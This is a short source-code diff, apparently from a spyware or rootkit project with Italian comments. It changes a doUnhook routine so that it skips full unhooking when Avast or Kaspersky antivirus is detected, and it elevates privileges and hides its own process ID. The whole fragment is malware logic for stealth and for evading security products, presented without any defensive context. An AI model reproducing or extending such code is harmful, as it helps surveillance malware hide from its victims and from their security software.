@@ -649,7 +649,7 @@ BOOL doUnhook()
 	// fa tutto ciò che serve
 	if (IsVista(&dummy))
 		dev_unhook.unhook_getadmin();
-	if (!IsAvast())
+	if (!IsAvast() && !IsKaspersky())
 		dev_unhook.unhook_all(FALSE);
 	dev_unhook.unhook_func("ZwSetValueKey", TRUE);
 	dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);
